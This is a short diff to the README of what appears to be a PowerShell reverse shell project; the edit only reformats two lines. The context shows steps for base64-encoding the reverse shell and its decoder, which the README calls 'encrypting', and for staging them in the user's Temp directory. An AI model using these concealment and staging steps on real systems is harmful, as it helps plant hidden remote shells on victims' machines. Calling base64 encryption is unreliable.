@@ -85,7 +85,7 @@ This project is a learning exercise inspired by [Martin Sohn's PowerShell Revers
 
 1. **Encrypt your reverseshell:**
 
-    *Make Sure You Entered the IP and Port number first*
+    - *Make Sure You Entered the IP and Port number first*
     
     ```powershell
     $c = get-content -path .\powershell-reverseshell-dns-tls.ps1
@@ -93,7 +93,7 @@ This project is a learning exercise inspired by [Martin Sohn's PowerShell Revers
     $encrypt = [convert]::tobase64string($bytes)
     set-content -path .\powershell-encrypted.bin -value $encrypt
     ```
-    *encrypt the decoder.ps1 file the same way*
+    - *encrypt the decoder.ps1 file the same way*
 
 2. **Store them in User's Temp Directory:**
 
